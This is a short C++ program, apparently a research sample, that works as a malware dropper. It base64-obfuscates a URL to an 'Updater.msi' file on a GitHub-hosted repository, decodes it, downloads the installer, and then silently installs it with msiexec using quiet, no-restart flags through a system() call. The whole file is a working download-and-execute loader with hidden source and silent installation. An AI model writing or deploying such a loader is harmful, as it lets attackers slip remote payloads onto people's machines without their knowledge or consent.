#include <iostream>
#include "Base64Helper.h"
#include "Downloader.h"



int main() {
	// Encoded Variables
	std::string encodedMsiUrl = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FsZWt6YW5kci9SZXNlYXJjaC9tYWluL0lEQVQvVXBkYXRlci5tc2k="; // https://github.com/alekzandr/Research/IDAT/Updater.msi
	std::string decodedMsiUrl = Base64Decode(encodedMsiUrl);

	std::string encodedMsiFileName = "VXBkYXRlci5tc2k="; // Updater.msi
	std::string decodedMsiFileName = Base64Decode(encodedMsiFileName);

	std::cout << "Decoded: " << decodedMsiUrl << std::endl;
	std::cout << "Decoded: " << decodedMsiFileName << std::endl;

	// Download MSI File
	if (downloadFile(decodedMsiUrl, decodedMsiFileName)) {
		std::cout << "Download successful!" << std::endl;
	}
	else {
		std::cout << "Download failed." << std::endl;
	}

	// Execute misexec to install MSI file
	std::string installCommand = "C:\\Windows\\System32\\msiexec.exe /i " + decodedMsiFileName + " /qn /quiet /norestart";
	system(installCommand.c_str());



	return 0;

}

